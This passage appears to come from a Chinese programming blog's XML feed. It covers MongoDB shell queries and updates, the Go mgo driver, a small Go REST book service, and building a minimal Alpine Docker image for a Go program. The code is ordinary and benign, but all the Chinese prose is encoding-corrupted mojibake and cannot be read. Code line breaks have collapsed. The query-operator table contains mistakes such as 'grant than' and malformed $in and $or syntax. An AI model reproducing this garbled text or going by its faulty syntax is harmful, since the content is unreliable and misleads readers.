å¯é€‰ï¼Œä½¿ç”¨æŠ•å½±æ“ä½œç¬¦æŒ‡å®šè¿”å›çš„é”®ã€‚æŸ¥è¯¢æ—¶è¿”å›æ–‡æ¡£ä¸­æ‰€æœ‰é”®å€¼ï¼Œ åªéœ€çœç•¥è¯¥å‚æ•°å³å¯ï¼ˆé»˜è®¤çœç•¥ï¼‰ 123456789# æŸ¥çœ‹æ‰€æœ‰&gt; db.students.find()&#123; "_id" : ObjectId("5a1632029d83b8def7401005"), "name" : "Bob", "age" : 22 &#125;# æŸ¥çœ‹æŒ‡å®šæŸä¸ª&gt; db.students.find(&#123;"name": "Bob"&#125;);&#123; "_id" : ObjectId("5a1632029d83b8def7401005"), "name" : "Bob", "age" : 22 &#125;# æŸ¥çœ‹æŒ‡å®šå¯¹è±¡çš„æŒ‡å®šå­—æ®µ(æ³¨æ„ 1:ä»£è¡¨è¦å±•ç°è¯¥å­—æ®µ, 0: ä»£è¡¨ä¸å±•ç°è¯¥å­—æ®µ, é»˜è®¤"_id"ä¸ºè¦å±•ç¤º)&gt; db.students.find(&#123;"name": "Bob"&#125;, &#123;"age": 1, "_id": 0&#125;);&#123; "age" : 22 &#125; æ˜¯ä¸æ˜¯å¾ˆç®€å•, æ¥çœ‹çœ‹é«˜çº§ç‚¹çš„æŸ¥è¯¢è¯­æ³•: æ¡ä»¶æ¯”è¾ƒ æ“ä½œ æè¿° è¯­æ³• $gt grant than {field: {$gt: value}} $gte grant than equal {field: {$gte: value}} $lt less than {field: {$lt: value}} $lte less than equal {field: {$lte: value}} $eq equal {field: {$eq: value}} $ne not equal {field: {$ne: value}} $in in {field: {field: {$in: [value, value, â€¦]}} $nin not in {field: {field: {$nin: [value, value, â€¦]}} æ¡ä»¶ç»„åˆ æ“ä½œ æè¿° è¯­æ³• $or æˆ– {$or: [{}, {}, â€¦} $and ä¸ {$and: [{}, {}, â€¦} $not é $nor å å…ƒç´ æŸ¥è¯¢ æ“ä½œ æè¿° è¯­æ³• $exists exist {filed: {$exists: } $mod $type è¿”å›æŒ‡å®š å­—æ®µç±»å‹çš„æ–‡æ¡£ {filed: {$type: }}, 1. Double 2. String 3.Object 4. Array 5 Binary data â€¦ ä¿®æ”¹æ•°æ®è¯­æ³•: db.mycoll.update(query, object[, upsert_bool, multi_bool])å‚æ•°: query: updateçš„æŸ¥è¯¢æ¡ä»¶ï¼Œç±»ä¼¼sql updateæŸ¥è¯¢å†…whereåé¢çš„ã€‚ update: updateçš„å¯¹è±¡å’Œä¸€äº›æ›´æ–°çš„æ“ä½œç¬¦ï¼ˆå¦‚$,$incâ€¦ï¼‰ç­‰ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºsql updateæŸ¥è¯¢å†…setåé¢çš„ã€‚ upsert: å¯é€‰ï¼Œè¿™ä¸ªå‚æ•°çš„æ„æ€æ˜¯ï¼Œå¦‚æœä¸å­˜åœ¨updateçš„è®°å½•ï¼Œæ˜¯å¦æ’å…¥objNew,trueä¸ºæ’å…¥ï¼Œé»˜è®¤æ˜¯falseï¼Œä¸æ’å…¥ã€‚ multi: å¯é€‰ï¼Œmongodb é»˜è®¤æ˜¯false,åªæ›´æ–°æ‰¾åˆ°çš„ç¬¬ä¸€æ¡è®°å½•ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°ä¸ºtrue,å°±æŠŠæŒ‰æ¡ä»¶æŸ¥å‡ºæ¥å¤šæ¡è®°å½•å…¨éƒ¨æ›´æ–°ã€‚ 1234567891011121314# æˆ‘ä»¬å…ˆçœ‹çœ‹æœ‰å“ªäº›æ•°æ®&gt; db.students.find()&#123; "_id" : ObjectId("5a1632029d83b8def7401005"), "name" : "Bob", "age" : 22 &#125;&#123; "_id" : ObjectId("5a16c89f4da8732f195b4000"), "name" : "Aollen", "age" : 21 &#125;&#123; "_id" : ObjectId("5a16c8b74da8732f195b4001"), "name" : "tom", "age" : 20 &#125;# æ›´æ–°æŒ‡å®šå¯¹è±¡&gt; db.students.update(&#123;"name": "Bob"&#125;, &#123;$set:&#123;"age": 32&#125;&#125;)WriteResult(&#123; "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 &#125;)# æŒ‰æ¡ä»¶æ›´æ–°åŒ¹é…åˆ°çš„ç¬¬ä¸€æ¡(SQL Where)&gt; db.students.update(&#123;"age": &#123;$gt: 20&#125;&#125;, &#123;$set:&#123;"age": 30&#125;&#125;)WriteResult(&#123; "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 &#125;)# æŒ‰æ¡ä»¶æ›´æ–°åŒ¹é…åˆ°çš„æ‰€æœ‰(SQL Where)&gt; db.students.update(&#123;"age": &#123;$gt: 20&#125;&#125;, &#123;$set:&#123;"age": 30&#125;&#125;, false, true)WriteResult(&#123; "nMatched" : 2, "nUpserted" : 0, "nModified" : 1 &#125;) é«˜çº§ç‚¹çš„è¯­æ³•: æ›´æ–°ç¬¬ä¸€ä¸ªè¢«åŒ¹é…åˆ°çš„æ–‡æ¡£: db.mycoll.updateOne(filter, update, \), å¯é€‰å‚æ•°: upsert, w, wtimeout, j æ›´æ–°æ‰€æœ‰è¢«åŒ¹é…åˆ°çš„æ–‡æ¡£: db.mycoll.updateMany(filter, update, \), å¯é€‰å‚æ•°: upsert, w, wtimeout, j åˆ é™¤æ•°æ®è¯­æ³•: db.mycoll.remove(\) 123456# åˆ é™¤æŒ‡å®šçš„å¯¹è±¡&gt; db.students.remove(&#123;"name": "Bob"&#125;)WriteResult(&#123; "nRemoved" : 1 &#125;)# åˆ é™¤è¯¥collectioné‡Œé¢çš„æ‰€æœ‰å¯¹è±¡&gt; db.students.remove(&#123;&#125;)WriteResult(&#123; "nRemoved" : 2 &#125;) mongo golangé©±åŠ¨mgoçš„ä½¿ç”¨åœ¨mongodbçš„é©±åŠ¨é‡Œé¢Golangé©±åŠ¨æ¨èä½¿ç”¨mgo.1go get gopkg.in/mgo.v2 åœ¨ä½¿ç”¨ä¹‹å‰æˆ‘ä»¬å…ˆçœ‹çœ‹è¿æ¥MongoDBçš„URI Format: mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]å‚æ•°è¯´æ˜: mongodb:// è¿™æ˜¯å›ºå®šçš„æ ¼å¼ï¼Œå¿…é¡»è¦æŒ‡å®šã€‚ username:password@ å¯é€‰é¡¹ï¼Œå¦‚æœè®¾ç½®ï¼Œåœ¨è¿æ¥æ•°æ®åº“æœåŠ¡å™¨ä¹‹åï¼Œé©±åŠ¨éƒ½ä¼šå°è¯•ç™»é™†è¿™ä¸ªæ•°æ®åº“ host1 å¿…é¡»çš„æŒ‡å®šè‡³å°‘ä¸€ä¸ªhost, host1 æ˜¯è¿™ä¸ªURIå”¯ä¸€è¦å¡«å†™çš„ã€‚å®ƒæŒ‡å®šäº†è¦è¿æ¥æœåŠ¡å™¨çš„åœ°å€ã€‚å¦‚æœè¦è¿æ¥å¤åˆ¶é›†ï¼Œè¯·æŒ‡å®šå¤šä¸ªä¸»æœºåœ°å€ã€‚ portX å¯é€‰çš„æŒ‡å®šç«¯å£ï¼Œå¦‚æœä¸å¡«ï¼Œé»˜è®¤ä¸º27017 /database å¦‚æœæŒ‡å®šusername:password@ï¼Œè¿æ¥å¹¶éªŒè¯ç™»é™†æŒ‡å®šæ•°æ®åº“ã€‚è‹¥ä¸æŒ‡å®šï¼Œé»˜è®¤æ‰“å¼€ test æ•°æ®åº“ã€‚ ?options æ˜¯è¿æ¥é€‰é¡¹ã€‚å¦‚æœä¸ä½¿ç”¨/databaseï¼Œåˆ™å‰é¢éœ€è¦åŠ ä¸Š/ã€‚æ‰€æœ‰è¿æ¥é€‰é¡¹éƒ½æ˜¯é”®å€¼å¯¹name=valueï¼Œé”®å€¼å¯¹ä¹‹é—´é€šè¿‡&amp;æˆ–;ï¼ˆåˆ†å·ï¼‰éš”å¼€ ä¸‹é¢ä¸¾2ä¸ªç®€å•å¾—æ —å­, å› ä¸ºç­‰ä¸‹å›ä½¿ç”¨åˆ°:1234# ç”¨æˆ·: admin å¯†ç : 123456 åœ°å€: localhost æ•°æ®åº“: testmongodb://admin:123456@localhost:27017/test# ä»¥å®‰å…¨æ¨¡å¼è¿æ¥åˆ°replica setï¼Œå¹¶ä¸”ç­‰å¾…è‡³å°‘ä¸¤ä¸ªå¤åˆ¶æœåŠ¡å™¨æˆåŠŸå†™å…¥ï¼Œè¶…æ—¶æ—¶é—´è®¾ç½®ä¸º2ç§’ã€‚mongodb://host1,host2,host3/?safe=true;w=2;wtimeoutMS=2000 å¦‚æœæƒ³è¦äº†è§£å…³äºæ­¤æ›´è¯¦ç»†çš„æ–‡æ¡£, è¯·æŸ¥çœ‹: MongoDBå®˜æ–¹æ–‡æ¡£å…³äºconnection-stringçš„è¯¦è§£ èœé¸Ÿå­¦é™¢MongoDBè¿æ¥ åŸºæœ¬æ —å­é¦–å…ˆæˆ‘ä»¬å…ˆäº†è§£mgoä¸€äº›æœ€åŸºæœ¬çš„ç”¨æ³•:123456789101112131415161718192021222324252627282930313233343536373839import ( "fmt" "log" "gopkg.in/mgo.v2" "gopkg.in/mgo.v2/bson")// Person is testtype Person struct &#123; Name string Phone string&#125;func main() &#123; session, err := mgo.Dial("mongodb://127.0.0.1:27017/") if err != nil &#123; panic(err) &#125; defer session.Close() // Optional. Switch the session to a monotonic behavior. session.SetMode(mgo.Monotonic, true) c := session.DB("test").C("people") err = c.Insert(&amp;Person&#123;"Ale", "+55 53 8116 9639"&#125;, &amp;Person&#123;"Cla", "+55 53 8402 8510"&#125;) if err != nil &#123; log.Fatal(err) &#125; result := Person&#123;&#125; err = c.Find(bson.M&#123;"name": "Ale"&#125;).One(&amp;result) if err != nil &#123; log.Fatal(err) &#125; fmt.Println("Phone:", result.Phone)&#125; æœ€ç»ˆæˆ‘ä»¬ç”¨mongo-shellè¿æ¥æ•°æ®åº“, éªŒè¯ä¸‹ç¨‹åºæ˜¯å¦ç”Ÿæ•ˆ:123&gt; db.people.find()&#123; "_id" : ObjectId("5a16dd323bde4bd3cde02654"), "name" : "Ale", "phone" : "+55 53 8116 9639" &#125;&#123; "_id" : ObjectId("5a16dd323bde4bd3cde02655"), "name" : "Cla", "phone" : "+55 53 8402 8510" &#125; å¾®æœåŠ¡æ —å­ä¸‹é¢æ˜¯ä¸€ä¸ªåŸºäºMongoDBçš„å¾®æœåŠ¡çš„æ —å­:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218package mainimport ( "encoding/json" "fmt" "log" "net/http" "github.com/julienschmidt/httprouter" "gopkg.in/mgo.v2" "gopkg.in/mgo.v2/bson")func ErrorWithJSON(w http.ResponseWriter, message string, code int) &#123; w.Header().Set("Content-Type", "application/json; charset=utf-8") w.WriteHeader(code) fmt.Fprintf(w, "&#123;message: %q&#125;", message)&#125;func ResponseWithJSON(w http.ResponseWriter, json []byte, code int) &#123; w.Header().Set("Content-Type", "application/json; charset=utf-8") w.WriteHeader(code) w.Write(json)&#125;type Book struct &#123; ISBN string `json:"isbn"` Title string `json:"title"` Authors []string `json:"authors"` Price string `json:"price"`&#125;func main() &#123; session, err := mgo.Dial("localhost:27017") if err != nil &#123; panic(err) &#125; defer session.Close() session.SetMode(mgo.Monotonic, true) ensureIndex(session) router := httprouter.New() router.GET("/books", allBooks(session)) router.POST("/books", addBook(session)) router.GET("/books/:isbn", bookByISBN(session)) router.PUT("/books/:isbn", updateBook(session)) router.DELETE("/books/:isbn", deleteBook(session)) http.ListenAndServe("localhost:8080", router)&#125;func ensureIndex(s *mgo.Session) &#123; session := s.Copy() defer session.Close() c := session.DB("store").C("books") index := mgo.Index&#123; Key: []string&#123;"isbn"&#125;, Unique: true, DropDups: true, Background: true, Sparse: true, &#125; err := c.EnsureIndex(index) if err != nil &#123; panic(err) &#125;&#125;func allBooks(s *mgo.Session) func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; return func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; session := s.Copy() defer session.Close() c := session.DB("store").C("books") var books []Book err := c.Find(bson.M&#123;&#125;).All(&amp;books) if err != nil &#123; ErrorWithJSON(w, "Database error", http.StatusInternalServerError) log.Println("Failed get all books: ", err) return &#125; respBody, err := json.MarshalIndent(books, "", " ") if err != nil &#123; log.Fatal(err) &#125; ResponseWithJSON(w, respBody, http.StatusOK) &#125;&#125;func addBook(s *mgo.Session) func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; return func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; session := s.Copy() defer session.Close() var book Book decoder := json.NewDecoder(r.Body) err := decoder.Decode(&amp;book) if err != nil &#123; ErrorWithJSON(w, "Incorrect body", http.StatusBadRequest) return &#125; c := session.DB("store").C("books") err = c.Insert(book) if err != nil &#123; if mgo.IsDup(err) &#123; ErrorWithJSON(w, "Book with this ISBN already exists", http.StatusBadRequest) return &#125; ErrorWithJSON(w, "Database error", http.StatusInternalServerError) log.Println("Failed insert book: ", err) return &#125; w.Header().Set("Content-Type", "application/json") w.Header().Set("Location", r.URL.Path+"/"+book.ISBN) w.WriteHeader(http.StatusCreated) &#125;&#125;func bookByISBN(s *mgo.Session) func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; return func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; session := s.Copy() defer session.Close() isbn := ps.ByName("isbn") c := session.DB("store").C("books") var book Book err := c.Find(bson.M&#123;"isbn": isbn&#125;).One(&amp;book) if err != nil &#123; ErrorWithJSON(w, "Database error", http.StatusInternalServerError) log.Println("Failed find book: ", err) return &#125; if book.ISBN == "" &#123; ErrorWithJSON(w, "Book not found", http.StatusNotFound) return &#125; respBody, err := json.MarshalIndent(book, "", " ") if err != nil &#123; log.Fatal(err) &#125; ResponseWithJSON(w, respBody, http.StatusOK) &#125;&#125;func updateBook(s *mgo.Session) func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; return func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; session := s.Copy() defer session.Close() isbn := ps.ByName("isbn") var book Book decoder := json.NewDecoder(r.Body) err := decoder.Decode(&amp;book) if err != nil &#123; ErrorWithJSON(w, "Incorrect body", http.StatusBadRequest) return &#125; c := session.DB("store").C("books") err = c.Update(bson.M&#123;"isbn": isbn&#125;, &amp;book) if err != nil &#123; switch err &#123; default: ErrorWithJSON(w, "Database error", http.StatusInternalServerError) log.Println("Failed update book: ", err) return case mgo.ErrNotFound: ErrorWithJSON(w, "Book not found", http.StatusNotFound) return &#125; &#125; w.WriteHeader(http.StatusNoContent) &#125;&#125;func deleteBook(s *mgo.Session) func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; return func(w http.ResponseWriter, r *http.Request, ps httprouter.Params) &#123; session := s.Copy() defer session.Close() isbn := ps.ByName("isbn") c := session.DB("store").C("books") err := c.Remove(bson.M&#123;"isbn": isbn&#125;) if err != nil &#123; switch err &#123; default: ErrorWithJSON(w, "Database error", http.StatusInternalServerError) log.Println("Failed delete book: ", err) return case mgo.ErrNotFound: ErrorWithJSON(w, "Book not found", http.StatusNotFound) return &#125; &#125; w.WriteHeader(http.StatusNoContent) &#125;&#125; æµ‹è¯•:123456789101112131415161718192021222324252627282930313233343536# åˆ›å»ºä¸€æœ¬book maojun@maojun-mbp $ curl -X POST \&gt; http://localhost:8080/books \&gt; -H 'content-type: application/json' \&gt; -d '&#123;"isbn": "aabbxx", "title": "test titile", "authors":["bob", "aollen"], "price": "100"&#125;'# æŸ¥çœ‹åˆ›å»ºçš„bookåˆ—è¡¨ maojun@maojun-mbp $ curl -X GET http://localhost:8080/books[ &#123; "isbn": "aabbxx", "title": "test titile", "authors": [ "bob", "aollen" ], "price": "100" &#125;]# æŸ¥çœ‹æŒ‡å®šçš„book maojun@maojun-mbp $ curl -X GET http://localhost:8080/books/aabbxx&#123; "isbn": "aabbxx", "title": "test titile", "authors": [ "bob", "aollen" ], "price": "100"&#125;# æ›´æ–°æŒ‡å®šçš„book maojun@maojun-mbp $ curl -X PUT \&gt; http://localhost:8080/books/aabbxx \&gt; -H 'content-type: application/json' \&gt; -d '&#123;"isbn": "aabbxx", "price": "99"&#125;'# åˆ é™¤æŒ‡å®šçš„book âœ˜ maojun@maojun-mbp $ curl -X DELETE http://localhost:8080/books/aabbxx å‚è€ƒmongodbä½¿ç”¨æ‰‹å†Œmongodbæ¶æ„æ–‡æ¡£èœé¸Ÿå­¦é™¢mongodbæ•™ç¨‹mgoæ–‡æ¡£]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ„å»ºGolangç¨‹åºæœ€å°Dockeré•œåƒ]]></title>
    <url>%2F2017%2F11%2F20%2Fgolang-mini-docker-image%2F</url>
    <content type="text"><![CDATA[åº”ç”¨å®¹å™¨åŒ–æ–¹ä¾¿äº†éƒ¨ç½²ï¼Œé¿å…å®é™…ä¸­å¼€å‘ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒä¸ä¸€è‡´è€Œå¯¼è‡´çš„éƒ¨ç½²å›°éš¾, è€Œä¸”ï¼Œå®¹å™¨åŒ–ä¹‹åè¿˜å¯ä»¥å¯¹åº”ç”¨æ‰€ä½¿ç”¨çš„CPUã€å†…å­˜ç­‰èµ„æºåšé™åˆ¶ï¼Œè¿™äº›éƒ½æ˜¯å®¹å™¨åŒ–ä¹‹åçš„å¯ä»¥å¸¦æ¥çš„æ–¹ä¾¿ã€‚è¿™ç¯‡æ–‡ç« å°†ä¼šå°†å¦‚ä½•build Dockeré•œåƒ(æœ€å°åŒ–build), å®¹å™¨åŒ–ä½ çš„Golangåº”ç”¨ã€‚ ä¸ºä»€ä¹ˆéœ€è¦æ„å»ºå°çš„é•œåƒæˆ‘ä»¬çŸ¥é“æ„å»ºä¸€ä¸ªDockeré•œåƒçš„æ—¶å€™å¾€å¾€éœ€è¦å¼•å…¥ä¸€äº›ç¨‹åºä¾èµ–çš„ä¸œè¥¿ï¼Œæœ€å¸¸è§çš„å°±æ˜¯å¼•å…¥ä¸€ä¸ªåŸºç¡€æ“ä½œç³»ç»Ÿé•œåƒï¼Œä½†è¿™æ ·å¾€å¾€ä¼šä½¿å¾—ç¼–è¯‘å‡ºæ¥çš„é•œåƒç‰¹åˆ«å¤§ã€‚å°±æ‹¿Pythonæ¥è¯´, ä¹‹å‰buildçš„é•œåƒä¸€èˆ¬éƒ½å¤§äº600M, å¦‚æœè¿™ä¸ªé¡¹ç›®æ˜¯å†…éƒ¨é¡¹ç›®, å…¶å®é—®é¢˜ä¸å¤§, å› ä¸ºå†…ç½‘ä¸€èˆ¬ä¹Ÿä¼šæ­å»ºé•œåƒä»“åº“, å†…ç½‘æ•°æ®ä¹Ÿå¿«, ä½†æ˜¯å¦‚æœæ˜¯å¼€æºé¡¹ç›®, é•œåƒè¿‡å¤§å°±æ˜¯ä¸ªé—®é¢˜ã€‚å¯¹æ‹‰å–è€…å¸¦å®½è¦æ±‚è¾ƒé«˜, è€ŒDocker hubçš„é€Ÿåº¦å¤§å®¶ä¹Ÿéƒ½çŸ¥é“, å½“ç„¶å¦‚æœä½ ä½¿ç”¨é•œåƒåŠ é€Ÿä½“éªŒä¼šå¥½å¾ˆå¤šã€‚ä½†æ˜¯å¦‚æœèƒ½åšåˆ°æŠŠé•œåƒå˜å°, åšåˆ°å‡ M, å‡ åMé‚£ä¹ˆå¯¹äºä½ é¡¹ç›®çš„ä½¿ç”¨è€…æ¥è¯´ä½“éªŒä¼šå¥½å¾ˆå¤š. å› ä¸ºGoæ˜¯é™æ€ç¼–è¯‘è¯­è¨€, å¯ä»¥åšåˆ°0ä¾èµ–, å› æ­¤å¯ä»¥æ„å»ºå¾ˆå°çš„ç¨‹åºé•œåƒ, ä½†æ˜¯å…¶å®è¿˜æ˜¯æœ‰äº›å°æ’æ›², è¿™ä¹Ÿå°±æ˜¯è¿™ç¯‡æ–‡ç« å‡ºç°çš„åŸå› . ç¨‹åºæ ·ä¾‹è¿™é‡Œä»¥ä¸€ä¸ªç®€å•çš„hello worldçš„WEB APIç¨‹åºä¸ºä¾‹:1234567891011121314151617181920212223package mainimport ( "log" "net/http")// greeter hello world examplefunc greeter(w http.ResponseWriter, r *http.Request) &#123; w.Write([]byte("hello world!")) w.WriteHeader(http.StatusOK) return&#125;func main() &#123; http.HandleFunc("/", greeter) addr := "0.0.0.0:8080" log.Printf("start service at: %s ... \n", addr) err := http.ListenAndServe(addr, nil) if err != nil &#123; log.Fatal("ListenAndServe: ", err) &#125;&#125; æœ€ç»ˆä¼šæŠŠè¿™ä¸ªç¨‹åºæ‰“åŒ…æˆä¸€ä¸ªæœ€å°çš„dockeré•œåƒè¿›è¡Œå‘å¸ƒ, è®©æˆ‘ä»¬çœ‹çœ‹è¿™æ ·ä¸€ä¸ªé•œåƒbuildå‡ºæ¥è¿‡ååˆ°åº•æœ‰å¤šå¤§ã€‚ ç¼–è¯‘æ—¶çš„é—®é¢˜ç¼–è¯‘æ—¶çš„ä¸»è¦é—®é¢˜å°±æ˜¯å¦‚æœå°†Golangç¨‹åºç¼–è¯‘æˆä¸€ä¸ªçœŸæ­£æ²¡æœ‰ä¾èµ–çš„äºŒè¿›åˆ¶ç¨‹åº, ä¹Ÿè®¸æœ‰äººä¼šé—®Goæœ¬èº«ä¸å°±æ˜¯é™æ€ç¼–è¯‘å—ï¼Ÿè¿™é‡Œå°±éœ€è¦èŠèŠGolangé‡Œé¢CGOäº†ã€‚ å…³äº-installsuffix cgoå‚æ•°Go1.5ç‰ˆæœ¬ä¹‹å‰ï¼ŒGoé‡Œé¢çš„ä¸€äº›åº“å‡½æ•°æ˜¯ç”¨Cå®ç°çš„(ç½‘ç»œæ–¹é¢çš„å±…å¤š), ä¹Ÿå°±æ˜¯CGOã€‚å¦‚æœä½ çš„ä»£ç ä¸­ä½¿ç”¨äº†è¿™äº›Cå®ç°çš„åº“å‡½æ•°ï¼Œé‚£ä½ å°±è¦åŠ ä¸Š-installsuffix cgoè¿™ä¸ªå‚æ•°ï¼Œè®©å®ƒç¼–è¯‘çš„æ—¶å€™å»CGOé‡Œé¢æ‰¾ï¼Œå¦åˆ™ç¼–è¯‘æ—¶ä¼šæŠ¥é”™ã€‚ä½†æ˜¯Go1.5ç‰ˆæœ¬å¼€å§‹å®ç°äº†è‡ªä¸¾ï¼Œæ‰€æœ‰çš„æ ‡å‡†åº“éƒ½æ˜¯ç”¨Goä»£ç å®ç°ï¼Œå°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜äº†ã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ çš„Goç‰ˆæœ¬æ˜¯1.5ä¹‹å‰çš„ï¼Œæœ€å¥½åŠ ä¸Šè¿™ä¸ªå‚æ•°ï¼Œå½“ç„¶å¦‚æœä½ çš„ä»£ç ä¸­æ²¡ç”¨ä½¿ç”¨Cå®ç°çš„åº“ï¼Œé‚£ä¸åŠ ä¹Ÿä¸ä¼šæŠ¥é”™ã€‚å¦‚æœä½ çš„Goæ˜¯1.5åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œå°±ä¸éœ€è¦å†åŠ è¿™ä¸ªå‚æ•°äº†ã€‚ å…³äºCGO_ENABLED=0å‚æ•°CGO_ENABLED=0è¡¨ç¤ºé™æ€ç¼–è¯‘cgo, ä¸ä¼šlinkç³»ç»Ÿä¸Šçš„ä¸€äº›åŠ¨æ€é“¾æ¥åº“, å¦‚æœæƒ³è¦ç¼–è¯‘çš„äºŒè¿›åˆ¶åŒ…æ­£åœ¨æ— ä¾èµ–, è¿™éœ€è¦ç¦ç”¨CGO æœ‰äº†ä¸Šé¢2ç‚¹, æˆ‘ä»¬ä¸€èˆ¬ä¼šè¿™æ ·buildæˆ‘ä»¬çš„ç¨‹åº:1234# å¦‚æœGolang&lt;1.5CGO_ENABLED=0 GOOS=linux go build -a -v -installsuffix cgo -o app .# å¦‚æœGolang&gt;1.5CGO_ENABLED=0 GOOS=linux go build -a -v -o app . 12maojun@maojun-mbp $ du -sh app5.8M app è¿™æ ·æˆ‘ä»¬å°±ç¼–è¯‘å¥½äº†ä¸€ä¸ª0ä¾èµ–çš„äºŒè¿›åˆ¶åŒ…, æ‰“å‡ºæ¥çš„åŒ…5.8M, æ¥ä¸‹æ¥æˆ‘ä»¬å°†åŸºäºå®ƒåˆ¶é€ dockeré•œåƒã€‚ å¦‚ä½•é€‰æ‹©é•œåƒçš„Baseä¾èµ–åœ¨é€‰æ‹©æˆ‘ä»¬æ‰“åŒ…å¥½çš„äºŒè¿›åˆ¶åŒ…çš„è¿è¡Œä¾èµ–æ—¶, æˆ‘ä¸€èˆ¬ä¼šæœ‰è¿™3ç§è€ƒè™‘: scratch: å®ƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„é•œåƒ, å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªç©ºé•œåƒã€‚ä½†æ˜¯å®ƒå´æ˜¯éå¸¸é‡è¦ã€‚æˆ‘ä»¬çŸ¥é“Dockerfileæ–‡ä»¶å¿…é¡»ä»¥FROMå¼€å¤´ï¼Œä½†å¦‚æœæˆ‘ä»¬çš„é•œåƒçœŸçš„æ˜¯ä¸ä¾èµ–ä»»ä½•å…¶ä»–ä¸œè¥¿çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥FROM scratchã€‚åœ¨Docker 1.5.0ä¹‹åï¼ŒFROM scratchå·²ç»å˜æˆä¸€ä¸ªç©ºæ“ä½œ(no-op)ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸ä¼šå†å•ç‹¬å ä¸€å±‚äº†, å½“ç„¶ä¾èµ–è¿™å±‚çš„å¤§å°ä¹Ÿå°±ä¸º0äº†, å› æ­¤åŸºäºæ­¤å¯ä»¥æ„å»ºæœ€å°é•œåƒã€‚ alpine: Alpine Linuxæ˜¯ä¸€ä¸ªç¤¾åŒºå¼€å‘çš„é¢å‘å®‰å…¨åº”ç”¨çš„è½»é‡çº§Linuxå‘è¡Œç‰ˆ, é€‚åˆç”¨æ¥åšDockeré•œåƒã€è·¯ç”±å™¨ã€é˜²ç«å¢™ã€VPNsã€VoIP ç›’å­ ä»¥åŠæœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿï¼ŒåŸºäºuClibcå’ŒBusybox, å¤§å°åªæœ‰3.97Mã€‚ ubuntu: è¿™ä¸ªä¸ç”¨å¤šåšä»‹ç»äº†, å¦‚æœä½ ä¿¡ä¸è¿‡alpineè¿™ä¹Ÿç®—ä¸€ä¸ªä¸é”™çš„é€‰æ‹©, ubuntu16.04çš„é•œåƒå¤§å°ä¸º128Mã€‚ æˆ‘ä»¬é€‰æ‹©alpineä½œä¸ºbaseä¾èµ–, å› ä¸ºå®ƒè¶³å¤Ÿå°, è€Œä¸”æ˜¯ä¸€ä¸ªlinux, æœ‰shellç¯å¢ƒ, ä»¥å¤‡æœ‰æ—¶éœ€è¦è¿›å…¥å®¹å™¨ã€‚å®Œæ•´çš„Dockerfileå¦‚ä¸‹:12345FROM alpine:latestADD app /CMD ["/app"] æœ€ç»ˆé•œåƒå¤§å°åŸºäºåˆšæ‰å†™å¥½çš„dockerfileè¿›è¡Œbuild:123456789101112 maojun@maojun-mbp $ docker build -t app:v0.0.1 .Sending build context to Docker daemon 6.094MBStep 1/3 : FROM alpine:latest ---&gt; 053cde6e8953Step 2/3 : ADD app / ---&gt; 765750f573f1Step 3/3 : CMD /app ---&gt; Running in cb62cfd2ad1e ---&gt; 188a3189d4f8Removing intermediate container cb62cfd2ad1eSuccessfully built 188a3189d4f8Successfully tagged app:v0.0.1 buildå‡ºæ¥çš„imageå¤§å°:1app v0.0.1 188a3189d4f8 2 minutes ago 10.1MB æœ€åæˆ‘ä»¬æµ‹è¯•ä¸‹buildçš„é•œåƒæ˜¯å¦å¯ä»¥æ­£å¸¸ä½¿ç”¨:1234567 maojun@maojun-mbp $ docker run -itd -p 8080:8080 app:v0.0.19fe96a7868679f8be4e34905755dcd93343a70b9a0424791de2482647e69b2d8 maojun@maojun-mbp $ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9fe96a786867 app:v0.0.1 "/app" 4 seconds ago Up 2 seconds 0.0.0.0:8080-&gt;8080/tcp hungry_kilby maojun@maojun-mbp $ curl localhost:8080hello world!% æœ€ç»ˆé•œåƒå¤§å°: 10.1M, å¹¶ä¸”å¸¦æœ‰shell, å¦‚æœä½ ä½¿ç”¨scratchæ„å»ºä¼°è®¡åªæœ‰6Må¤šç‚¹, ä½†æ˜¯å®ç”¨æ€§å¯èƒ½ä¼šæœ‰æ‰€é™ä½ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>build</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golangç¨‹åºç‰ˆæœ¬ç®¡ç†]]></title>
    <url>%2F2017%2F11%2F19%2Fgolang-cli-version%2F</url>
